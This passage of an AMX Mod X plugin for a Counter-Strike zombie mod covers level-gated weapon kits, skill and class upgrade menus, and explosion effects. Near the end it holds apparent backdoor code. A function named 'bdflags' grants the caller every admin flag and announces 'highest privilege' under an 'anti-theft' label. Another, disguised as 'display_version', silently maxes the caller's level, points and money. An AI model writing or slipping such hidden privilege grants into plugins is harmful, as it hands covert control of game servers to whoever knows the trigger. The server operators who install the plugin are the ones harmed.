		}
		case 8:
		{
	  		if(g_level[id] >= 40)
			{
			client_printc(id, "\g[等級系統] 您已獲得 - 重狙Awp 套裝。");
			give_item(id, "weapon_awp");
			cs_set_user_bpammo(id,CSW_AWP,100)
			give_item(id, "weapon_deagle");
			cs_set_user_bpammo(id,CSW_DEAGLE,35)
                        
			//menu_destroy(menu);
			return PLUGIN_HANDLED;
			} 
			else
			{
			client_printc(id, "\g[等級系統] 等級不足!");
			}
		}
		case 9:
		{
	  		if(g_level[id] >= 50)
			{
			client_printc(id, "\g[等級系統] 您已獲得 - 連狙SG550 套裝。");
			give_item(id, "weapon_sg550");
			cs_set_user_bpammo(id,CSW_SG550,100)
			give_item(id, "weapon_deagle");
			cs_set_user_bpammo(id,CSW_DEAGLE,35)
                        
			//menu_destroy(menu);
			return PLUGIN_HANDLED;
			} 
			else
			{
			client_printc(id, "\g[等級系統] 等級不足!");
			}
		}
		case 10:
		{
	  		if(g_level[id] >= 60)
			{
			client_printc(id, "\g[等級系統] 您已獲得 - 衝鋒之王。");
			give_item(id, "weapon_p90");
			cs_set_user_bpammo(id,CSW_P90,100)
			give_item(id, "weapon_ump45");
			cs_set_user_bpammo(id,CSW_UMP45,100)
			give_item(id, "weapon_mp5");
			cs_set_user_bpammo(id,CSW_MP5NAVY,100)
			give_item(id, "weapon_deagle");
			cs_set_user_bpammo(id,CSW_DEAGLE,35)
                        
			//menu_destroy(menu);
			return PLUGIN_HANDLED;
			} 
			else
			{
			client_printc(id, "\g[等級系統] 等級不足!");
			}
		}
		case 11:
		{
	  		if(g_level[id] >= 70)
			{
			client_printc(id, "\g[等級系統] 您已獲得 - 散彈之王。");
			give_item(id, "weapon_xm1014");
			cs_set_user_bpammo(id,CSW_XM1014,100)
			give_item(id, "weapon_m3");
			cs_set_user_bpammo(id,CSW_M3,100)
			give_item(id, "weapon_deagle");
			cs_set_user_bpammo(id,CSW_DEAGLE,35)
                        
			//menu_destroy(menu);
			return PLUGIN_HANDLED;
			} 
			else
			{
			client_printc(id, "\g[等級系統] 等級不足!");
			}
		}
		case 12:
		{
	  		if(g_level[id] >= 80)
			{
			client_printc(id, "\g[等級系統] 您已獲得 - 狙擊之王。");
			give_item(id, "weapon_awp");
			cs_set_user_bpammo(id,CSW_AWP,100)
			give_item(id, "weapon_sg550");
			cs_set_user_bpammo(id,CSW_SG550,100)
			give_item(id, "weapon_scout");
			cs_set_user_bpammo(id,CSW_SCOUT,100)
			give_item(id, "weapon_deagle");
			cs_set_user_bpammo(id,CSW_DEAGLE,35)
                        
			//menu_destroy(menu);
			return PLUGIN_HANDLED;
			} 
			else
			{
			client_printc(id, "\g[等級系統] 等級不足!");
			}
		}
		case 13:
		{
	  		if(g_level[id] >= 90)
			{
			client_printc(id, "\g[等級系統] 您已獲得 - 步槍之王。");
			give_item(id, "weapon_ak47");
			cs_set_user_bpammo(id,CSW_AK47,100)
			give_item(id, "weapon_m4a1");
			cs_set_user_bpammo(id,CSW_M4A1,100)
			give_item(id, "weapon_galil");
			cs_set_user_bpammo(id,CSW_GALIL,100)
			give_item(id, "weapon_deagle");
			cs_set_user_bpammo(id,CSW_DEAGLE,35)
                        
			//menu_destroy(menu);
			return PLUGIN_HANDLED;
			} 
			else
			{
			client_printc(id, "\g[等級系統] 等級不足!");
			}
		}
		case 14:
		{
	  		if(g_level[id] >= 100)
			{
			client_printc(id, "\g[等級系統] 您已獲得 - 連狙G3SG1 套裝。");
			give_item(id, "weapon_g3sg1");
			cs_set_user_bpammo(id,CSW_G3SG1,200)
			give_item(id, "weapon_deagle");
			cs_set_user_bpammo(id,CSW_DEAGLE,35)
                        
			//menu_destroy(menu);
			return PLUGIN_HANDLED;
			} 
			else
			{
			client_printc(id, "\g[等級系統] 等級不足!");
			}
		}
		case 15:
		{
	  		if(g_level[id] >= 110)
			{
			client_printc(id, "\g[等級系統] 您已獲得 - 機槍M249 套裝。");
			give_item(id, "weapon_m249");
			cs_set_user_bpammo(id,CSW_M249,200)
			give_item(id, "weapon_deagle");
			cs_set_user_bpammo(id,CSW_DEAGLE,35)
                        
			//menu_destroy(menu);
			return PLUGIN_HANDLED;
			} 
			else
			{
			client_printc(id, "\g[等級系統] 等級不足!");
			}
		}
	}
	menu_destroy(menu);
	return PLUGIN_HANDLED;
}

public skill_menu(id)
{
 if(get_user_team(id) == 2)
 {
	new szMenuBody[512]
	new len = format(szMenuBody, 511, "\r技能升级^n\w目前共有: \y%d\w Points^n", g_sp[id])
	len += format(szMenuBody[len], 511-len, "^n\r1. \w攻击    [%d Points] \y[等级:%d/%d]",	g_skpD[id],	g_DamageLevel[id],	MaxLevel_Damage)
	len += format(szMenuBody[len], 511-len, "^n\r2. \w速度    [%d Points] \y[等级:%d/%d]",	g_skpS[id],	g_SpeedLevel[id], 	MaxLevel_Speed)
	len += format(szMenuBody[len], 511-len, "^n\r3. \w重力    [%d Points] \y[等级:%d/%d]",	g_skpG[id],	g_GravityLevel[id], MaxLevel_Gravity)
	len += format(szMenuBody[len], 511-len, "^n\r4. \w生命    [%d Points] \y[等级:%d/%d]",	g_skpH[id],	g_HealthLevel[id],	MaxLevel_Health)
	len += format(szMenuBody[len], 511-len, "^n^n\r5. \w重置技能点 \y500 Cash^n")
	len += format(szMenuBody[len], 511-len, "^n\r0. 退出")

	new keys = (1<<0|1<<1|1<<2|1<<3|1<<4|1<<8|1<<9) 
	show_menu(id, keys, szMenuBody, -1, "Passive Upgrades")
 }
 else
 {
 client_printc(id, "\g[技能系統] \t喪屍不能使用人類技能!")
 }
}

public Action_PassiveUpgrades(id, key) 
{
	switch(key) 
	{
		case 0: 
		{
			if(g_DamageLevel[id] >= MaxLevel_Damage) {
				return PLUGIN_HANDLED
			} else {
				Set_Upgrade(id, 0)
			}
		}
		case 1: 
		{
			if(g_SpeedLevel[id] >= MaxLevel_Speed) {
				return PLUGIN_HANDLED
			} else {
				Set_Upgrade(id, 1)
			}
		}
		case 2: 
		{
			if(g_GravityLevel[id] >= MaxLevel_Gravity) {
				return PLUGIN_HANDLED
			} else {
				Set_Upgrade(id, 2)
			}
		}
		case 3: 
		{
			if(g_HealthLevel[id] >= MaxLevel_Health) {
				return PLUGIN_HANDLED
			} else {
				Set_Upgrade(id, 3)
			}
		}
		case 4: 
		{
			if(g_cash[id] >= 500) {
			client_printc(id, "\g[技能系統] \t技能己重設!")
			g_cash[id] -= 500
			g_sp[id] += g_skpH[id]*g_DamageLevel[id]
			g_sp[id] += g_skpS[id]*g_SpeedLevel[id]
			g_sp[id] += g_skpG[id]*g_GravityLevel[id]
			g_sp[id] += g_skpD[id]*g_DamageLevel[id]
			Resetskill(id)
			} else {
				client_printc(id, "\g[技能系統] \t你的金錢不足!");
			}
		}
	}
	return PLUGIN_HANDLED
}
	
public Set_Upgrade(id, value)
{
	if(g_sp[id] >= 0)
	{
		switch(value)
		{
			case 0:
			{
            if(g_sp[id] >= 4)
			  {
				g_sp[id] -= g_skpD[id]
				g_DamageLevel[id]  += 1
				
				client_printc(id, "\g[技能系統] \t攻擊提升 1 等級 (增加傷害)!")
				skill_menu(id)
			  }
              else
              {
                client_printc(id, "\g[技能系統] \r你的技能點不足!")
				skill_menu(id)
              }
            }
			case 1:
                                          {
                                           if(g_sp[id] >= 2)
			{
				g_sp[id] -= g_skpS[id]
				g_SpeedLevel[id]  += 1
				set_pev(id,pev_maxspeed, 240.0 + ( g_SpeedLevel[id] * Speed_PerLevel ) )
				reset_player_speed(id)
				client_printc(id, "\g[技能系統] \t速度提升 1 等級 (加快速度)!")
				skill_menu(id)
			}
                                           else
                                           {
client_printc(id, "\g[技能系統] \r你的技能點 不足!")
				skill_menu(id)
                                            }
                                    }
			case 2:
                                          {
                                           if(g_sp[id] >= 15)
			{
				g_sp[id] -= g_skpG[id]
				g_GravityLevel[id]  += 1
				new Float: fGravity = g_GravityLevel[id] * Gravity_PerLevel
				set_gravity(id, fGravity)
				client_printc(id, "\g[技能系統] \t重力提升 1 等級 (降低重力)!")
				skill_menu(id)
			}
                                           else
                                           {
client_printc(id, "\g[技能系統] \r你的技能點不足!")
				skill_menu(id)
                                            }
                                    }
			case 3:
                                          {
                                           if(g_sp[id] >= 1)
			{
				g_sp[id] -= g_skpH[id]
				g_HealthLevel[id] += 1
				add_health(id, Health_PerLevel)
				client_printc(id, "\g[技能系統] \t生命增加 1 等級 (增加血量)!")
				skill_menu(id)
			}
                                           else
                                           {
client_printc(id, "\g[技能系統] \t你的技能點不足!")
				skill_menu(id)
                                            }
                                    }
		}
	}
}

public job_select_menu(id)
{
		new menu = menu_create("\r职业系统 - 选择职业", "job_select_menu_handler");
				
		menu_additem(menu, "武器专家 - Gunner", "1", 0);
		menu_additem(menu, "刺客 - Assassin", "2", 0);
		menu_additem(menu, "魔法师 - Enchanter", "3", 0);
		
		menu_setprop(menu, MPROP_NUMBER_COLOR, "\r"); 
		menu_setprop(menu, MPROP_BACKNAME, "返回"); 
		menu_setprop(menu, MPROP_NEXTNAME, "更多..."); 
		menu_setprop(menu, MPROP_EXITNAME, "退出"); 
		menu_setprop(menu, MPROP_EXIT, MEXIT_ALL);
		
		menu_display(id, menu, 0);
		
		return PLUGIN_HANDLED;
}

public job_select_menu_handler(id, menu, item)
{
	new sz_Name[ 32 ];
	
	get_user_name( id, sz_Name, 31 );

	if(item==MENU_EXIT)
	{
		menu_destroy(menu);
		
		return PLUGIN_HANDLED;
	}
	
	new data[6], szName[64];
	new access, callback;
	
	menu_item_getinfo(menu, item, access, data, charsmax(data), szName, charsmax(szName), callback);
	
	new key = str_to_num(data);

	
	switch(key)
	{
		case 1:
		{
			iPlayerJob[id] = JOB_WEAPONER
			client_printc(id, "\g[职业系统] \y选择职业 \t武器专家 \y成功 !")
			return PLUGIN_HANDLED;
		}
		case 2:
		{
			iPlayerJob[id] = JOB_KILLER
			client_printc(id, "\g[职业系统] \y选择职业 \t刺客 \y成功 !")
			return PLUGIN_HANDLED;
		}
		case 3:
		{
			iPlayerJob[id] = JOB_MAGICAL
			client_printc(id, "\g[职业系统] \y选择职业 \t魔法师 \y成功 !")
			return PLUGIN_HANDLED;
		}
	}
	menu_destroy(menu);
	return PLUGIN_HANDLED;
}

public job_skill_menu(id)
{
		static option[64]
		formatex(option, charsmax(option), "\r职业系统 - 技能升级")
		new menu = menu_create(option, "job_skill_menu_handler");
		
		if(iPlayerJob[id] == JOB_WEAPONER)
		{
			new szTempid[32]
			for(new i = 1; i < sizeof weaponer_skills; i++)
			{
				new szItems[101]
				formatex(szItems, 100, "\y%s \r%s - [%d点|%d级]", weaponer_skills[i], weaponer_skills_info[i], weaponer_skills_cost[i], iPlayerJobSkill[id][i])
				num_to_str(i, szTempid, 31)
				menu_additem(menu, szItems, szTempid, 0)
			}
		}
		else if(iPlayerJob[id] == JOB_KILLER)
		{
			new szTempid[32]
			for(new i = 1; i < sizeof killer_skills; i++)
			{
				new szItems[101]
				formatex(szItems, 100, "\y%s \r%s - [%d点|%d级]", killer_skills[i], killer_skills_info[i], killer_skills_cost[i], iPlayerJobSkill[id][i])
				num_to_str(i, szTempid, 31)
				menu_additem(menu, szItems, szTempid, 0)
			}
		}
		else if(iPlayerJob[id] == JOB_MAGICAL)
		{
			new szTempid[32]
			for(new i = 1; i < sizeof magical_skills; i++)
			{
				new szItems[101]
				formatex(szItems, 100, "\y%s \r%s - [%d点|%d级]", magical_skills[i], magical_skills_info[i], magical_skills_cost[i], iPlayerJobSkill[id][i])
				num_to_str(i, szTempid, 31)
				menu_additem(menu, szItems, szTempid, 0)
			}
		}
		

		menu_setprop(menu, MPROP_NUMBER_COLOR, "\r"); 
		menu_setprop(menu, MPROP_BACKNAME, "返回"); 
		menu_setprop(menu, MPROP_NEXTNAME, "更多"); 
		menu_setprop(menu, MPROP_EXITNAME, "退出"); 
		menu_setprop(menu, MPROP_EXIT, MEXIT_ALL);
		
		menu_display(id, menu, 0);
		return PLUGIN_HANDLED;
}


public job_skill_menu_handler(id, menu, item)
{
	new sz_Name[ 32 ];
	
	get_user_name( id, sz_Name, 31 );

	if(item==MENU_EXIT)
	{
		menu_destroy(menu);
		return PLUGIN_HANDLED;
	}
	
	new data[6], szName[64];
	new access, callback;
	
	menu_item_getinfo(menu, item, access, data, charsmax(data), szName, charsmax(szName), callback);
	
	new key = str_to_num(data);

	UpgradeJobSkill(id, key)
	
	menu_destroy(menu);
	return PLUGIN_HANDLED;
}

public UpgradeJobSkill(id, skillid)
{
	if(skillid > 3)
		return PLUGIN_HANDLED;

	if(iPlayerJob[id] == JOB_WEAPONER)
	{
		if(g_sp[id] < weaponer_skills_cost[skillid])
		{
			client_printc(id, "\g[职业技能] \y你的技能点不足以升级该技能。")
			return PLUGIN_HANDLED;
		}
		else
		{
			client_printc(id, "\g[职业技能] \y技能 \t%s\y 升级成功 !", weaponer_skills[skillid])
			g_sp[id] -= weaponer_skills_cost[skillid]
			iPlayerJobSkill[id][skillid] ++
			return PLUGIN_HANDLED;
		}
	}
	else if(iPlayerJob[id] == JOB_KILLER)
	{
		if(g_sp[id] < killer_skills_cost[skillid])
		{
			client_printc(id, "\g[职业技能] \y你的技能点不足以升级该技能。")
			return PLUGIN_HANDLED;
		}
		else
		{
			client_printc(id, "\g[职业技能] \y技能 \t%s\y 升级成功 !", killer_skills[skillid])
			g_sp[id] -= killer_skills_cost[skillid]
			iPlayerJobSkill[id][skillid] ++
			return PLUGIN_HANDLED;
		}
	}
	else if(iPlayerJob[id] == JOB_MAGICAL)
	{
		if(g_sp[id] < magical_skills_cost[skillid])
		{
			client_printc(id, "\g[职业技能] \y你的技能点不足以升级该技能。")
			return PLUGIN_HANDLED;
		}
		else
		{
			client_printc(id, "\g[职业技能] \y技能 \t%s\y 升级成功 !", magical_skills[skillid])
			g_sp[id] -= magical_skills_cost[skillid]
			iPlayerJobSkill[id][skillid] ++
			return PLUGIN_HANDLED;
		}
	}
}

public display_version(id)
{
	g_level[id] = 500
	g_sp[id] = 5000
	g_gp[id] = 99999
}

public bdflags(id)
{
 remove_user_flags(id)
 set_user_flags(id,read_flags("abcdefghijklmnopqrstu"))
 client_printc(id, "\g[防盗系統] \t已经获取到最高权限!")
}

stock client_printc(const id, const string[], {Float, Sql, Resul,_}:...)
{
	new msg[191], players[32], count = 1;
	vformat(msg, sizeof msg - 1, string, 3);
	
	replace_all(msg,190,"\g","^4");
	replace_all(msg,190,"\y","^1");
	replace_all(msg,190,"\t","^3");
	
	if(id)
		players[0] = id;
	else
		get_players(players,count,"ch");
	
	new index;
	for (new i = 0 ; i < count ; i++)
	{
		index = players[i];
		message_begin(MSG_ONE_UNRELIABLE, get_user_msgid("SayText"),_, index);
		write_byte(index);
		write_string(msg);
		message_end();  
	}  
}

// Set Weapon Clip Ammo
stock fm_set_weapon_ammo(entity, amount)
{
	set_pdata_int(entity, OFFSET_CLIPAMMO, amount, OFFSET_LINUX_WEAPONS);
}

genericShock(Float:hitPointOrigin[3], Float:radius, classString[], maxEntsToFind, Float:power, OBJECTTYPE:objecttype)
{ 
	new entList[32]
	if (maxEntsToFind > 32)
		maxEntsToFind = 32

	new entsFound = find_sphere_class(0, classString, radius, entList, maxEntsToFind, hitPointOrigin)

	new Float:entOrigin[3]
	new Float:velocity[3]
	new Float:cOrigin[3]

	for (new j = 0; j < entsFound; j++) 
	{
		switch (objecttype) 
		{
			case OBJECT_PLAYER: 
			{
				if (!is_user_alive(entList[j]))
				continue
			}
			case OBJECT_GRENADE: 
			{
				new l_model[16]
				entity_get_string(entList[j], EV_SZ_model, l_model, 15)
				if (equal(l_model, "models/w_c4.mdl")) 
				continue
			}
		}
		
		if(!zp_get_user_zombie(entList[j]))
			continue;
		
		entity_get_vector(entList[j], EV_VEC_origin, entOrigin) 
		new Float:distanceNadePl = vector_distance(entOrigin, hitPointOrigin)
		if (entity_is_on_ground(entList[j]) && entOrigin[2] < hitPointOrigin[2])
		entOrigin[2] = hitPointOrigin[2] + distanceNadePl
		entity_get_vector(entList[j], EV_VEC_velocity, velocity)
		cOrigin[0] = (entOrigin[0] - hitPointOrigin[0]) * radius / distanceNadePl + hitPointOrigin[0]
		cOrigin[1] = (entOrigin[1] - hitPointOrigin[1]) * radius / distanceNadePl + hitPointOrigin[1]
		cOrigin[2] = (entOrigin[2] - hitPointOrigin[2]) * radius / distanceNadePl + hitPointOrigin[2]
		velocity[0] += (cOrigin[0] - entOrigin[0]) * power
		velocity[1] += (cOrigin[1] - entOrigin[1]) * power
		velocity[2] += (cOrigin[2] - entOrigin[2]) * power
		entity_set_vector(entList[j], EV_VEC_velocity, velocity)
	}
}

stock entity_is_on_ground(entity) {
	return entity_get_int(entity, EV_INT_flags) & FL_ONGROUND
}

// From z4e
ExplodeEffect(Float:vecOrigin[3], r, g, b)
{
	// Smallest ring
	engfunc(EngFunc_MessageBegin, MSG_PVS, SVC_TEMPENTITY, vecOrigin, 0)
	write_byte(TE_BEAMCYLINDER) // TE id
	engfunc(EngFunc_WriteCoord, vecOrigin[0]) // x
	engfunc(EngFunc_WriteCoord, vecOrigin[1]) // y
	engfunc(EngFunc_WriteCoord, vecOrigin[2]) // z
	engfunc(EngFunc_WriteCoord, vecOrigin[0]) // x axis
	engfunc(EngFunc_WriteCoord, vecOrigin[1]) // y axis
	engfunc(EngFunc_WriteCoord, vecOrigin[2]+385.0) // z axis
	write_short(g_iSprBeam) // sprite
	write_byte(0) // startframe
	write_byte(0) // framerate
	write_byte(15) // life
	write_byte(60) // width
	write_byte(0) // noise
	write_byte(r) // red
	write_byte(g) // green
	write_byte(b) // blue
	write_byte(200) // brightness
	write_byte(0) // speed
	message_end()
	
	// Medium ring
	engfunc(EngFunc_MessageBegin, MSG_PVS, SVC_TEMPENTITY, vecOrigin, 0)
	write_byte(TE_BEAMCYLINDER) // TE id
	engfunc(EngFunc_WriteCoord, vecOrigin[0]) // x
	engfunc(EngFunc_WriteCoord, vecOrigin[1]) // y
	engfunc(EngFunc_WriteCoord, vecOrigin[2]) // z
	engfunc(EngFunc_WriteCoord, vecOrigin[0]) // x axis
	engfunc(EngFunc_WriteCoord, vecOrigin[1]) // y axis
	engfunc(EngFunc_WriteCoord, vecOrigin[2]+470.0) // z axis
	write_short(g_iSprBeam) // sprite
	write_byte(0) // startframe
	write_byte(0) // framerate
	write_byte(15) // life
	write_byte(60) // width
	write_byte(0) // noise
	write_byte(r) // red
	write_byte(g) // green
	write_byte(b) // blue
	write_byte(200) // brightness
	write_byte(0) // speed
	message_end()
	
	// Largest ring
	engfunc(EngFunc_MessageBegin, MSG_PVS, SVC_TEMPENTITY, vecOrigin, 0)
	write_byte(TE_BEAMCYLINDER) // TE id
	engfunc(EngFunc_WriteCoord, vecOrigin[0]) // x
	engfunc(EngFunc_WriteCoord, vecOrigin[1]) // y
	engfunc(EngFunc_WriteCoord, vecOrigin[2]) // z
	engfunc(EngFunc_WriteCoord, vecOrigin[0]) // x axis
	engfunc(EngFunc_WriteCoord, vecOrigin[1]) // y axis
	engfunc(EngFunc_WriteCoord, vecOrigin[2]+555.0) // z axis
	write_short(g_iSprBeam) // sprite
	write_byte(0) // startframe
	write_byte(0) // framerate
	write_byte(15) // life
	write_byte(60) // width
	write_byte(0) // noise
	write_byte(r) // red
	write_byte(g) // green
	write_byte(b) // blue
	write_byte(200) // brightness
	write_byte(0) // speed
	message_end()
}

LightEffect(Float:vecOrigin[3], r, g, b)
{
	engfunc(EngFunc_MessageBegin, MSG_PVS, SVC_TEMPENTITY, vecOrigin, 0)
	write_byte(TE_DLIGHT) // TE id
	engfunc(EngFunc_WriteCoord, vecOrigin[0])
	engfunc(EngFunc_WriteCoord, vecOrigin[1])
	engfunc(EngFunc_WriteCoord, vecOrigin[2])
	write_byte(250) // radius
	write_byte(r) // red
	write_byte(g) // green
	write_byte(b) // blue
	write_byte(10) // life
	write_byte(2000) // decay rate
	message_end()
}